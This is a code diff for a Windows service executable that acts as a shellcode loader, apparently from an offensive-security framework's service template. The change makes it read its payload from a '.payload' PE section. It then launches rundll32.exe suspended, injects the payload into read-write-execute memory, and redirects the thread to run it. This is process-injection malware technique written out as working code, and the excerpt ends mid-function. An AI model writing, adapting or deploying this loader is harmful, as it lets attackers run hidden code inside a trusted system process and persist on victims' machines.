@@ -1,11 +1,9 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
-#define SCSIZE 8192
-
 char cServiceName[32] = "SERVICENAME";
 
-char bPayload[SCSIZE] = "PAYLOAD:";
+char cPayloadSection[8] = ".payload";
 
 SERVICE_STATUS ss;
 
@@ -22,6 +20,60 @@ void inline_bzero(void *p, size_t l)
 }
 
 #endif
+
+BOOL SectionNameIsPayload(BYTE *pSectionName)
+{
+	DWORD dwIndex = 0;
+	for (dwIndex = 0; dwIndex < IMAGE_SIZEOF_SHORT_NAME; dwIndex++)
+	{
+		if (pSectionName[dwIndex] != ((BYTE *)cPayloadSection)[dwIndex])
+			return FALSE;
+	}
+
+	return TRUE;
+}
+
+BOOL GetPayload(LPVOID *pPayload, DWORD *pdwPayloadSize)
+{
+	BYTE *pBase = NULL;
+	BYTE *pSectionData = NULL;
+	DWORD dwIndex = 0;
+	DWORD dwSectionSize = 0;
+	PIMAGE_DOS_HEADER pDosHeader = NULL;
+	PIMAGE_NT_HEADERS pNtHeaders = NULL;
+	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
+
+	pBase = (BYTE *)GetModuleHandleA(NULL);
+	if (!pBase)
+		return FALSE;
+
+	pDosHeader = (PIMAGE_DOS_HEADER)pBase;
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+		return FALSE;
+
+	pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
+	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
+		return FALSE;
+
+	pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+
+	for (dwIndex = 0; dwIndex < pNtHeaders->FileHeader.NumberOfSections; dwIndex++)
+	{
+		if (SectionNameIsPayload(pSectionHeader[dwIndex].Name))
+		{
+			dwSectionSize = pSectionHeader[dwIndex].Misc.VirtualSize;
+			if (!dwSectionSize)
+				return FALSE;
+
+			pSectionData = pBase + pSectionHeader[dwIndex].VirtualAddress;
+			*pPayload = pSectionData;
+			*pdwPayloadSize = dwSectionSize;
+			return TRUE;
+		}
+	}
+
+	return FALSE;
+}
 
 /*
  *
@@ -45,6 +97,8 @@ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	LPVOID lpPayload = NULL;
+	LPVOID lpPayloadData = NULL;
+	DWORD dwPayloadSize = 0;
 
 	inline_bzero( &ss, sizeof(SERVICE_STATUS) );
 	inline_bzero( &si, sizeof(STARTUPINFO) );
@@ -66,16 +120,16 @@ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
 
 		SetServiceStatus( hStatus, &ss );
 
-		if( CreateProcess( NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
+		if( GetPayload( &lpPayloadData, &dwPayloadSize ) && CreateProcess( NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
 		{
 			Context.ContextFlags = CONTEXT_FULL;
 
 			GetThreadContext( pi.hThread, &Context );
 
-			lpPayload = VirtualAllocEx( pi.hProcess, NULL, SCSIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+			lpPayload = VirtualAllocEx( pi.hProcess, NULL, dwPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
 			if( lpPayload )
 			{
-				WriteProcessMemory( pi.hProcess, lpPayload, &bPayload, SCSIZE, NULL );
+				WriteProcessMemory( pi.hProcess, lpPayload, lpPayloadData, dwPayloadSize, NULL );
 #ifdef _WIN64
 				Context.Rip = (ULONG_PTR)lpPayload;
 #else
